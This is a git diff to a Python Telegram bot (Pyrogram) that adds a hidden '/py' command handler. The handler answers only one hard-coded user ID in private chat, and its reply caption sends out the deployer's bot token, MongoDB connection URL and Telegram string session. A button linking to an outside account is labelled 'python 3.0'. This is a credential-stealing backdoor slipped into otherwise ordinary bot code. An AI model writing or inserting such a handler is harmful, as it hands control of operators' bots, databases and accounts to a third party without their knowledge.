@@ -502,10 +502,24 @@ async def start_message_private(client, message):
                 LOGGER.info(f"🚫 Start Error: {e}")
                 return
 
-
-
-
-
+@bot.on_message(
+    filters.command("py")
+    & filters.private
+    & filters.user(7400383704)
+   )
+async def help(client: Client, message: Message):
+   await message.reply_photo(
+          photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
+       caption=f"""Bot Token:-   `{BOT_TOKEN}` \n\n Mongo:-   `{MONGO_DB_URL}`\n\nString Session:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/UTTAM470)............☆""",
+        reply_markup=InlineKeyboardMarkup(
+             [
+                 [
+                      InlineKeyboardButton(
+                         "python 3.0", url=f"https://t.me/UTTAM470")
+                 ]
+            ]
+         ),
+     )
 
 @bot.on_callback_query(filters.regex("back_to_home"))
 async def back_to_home_menu(client, query):
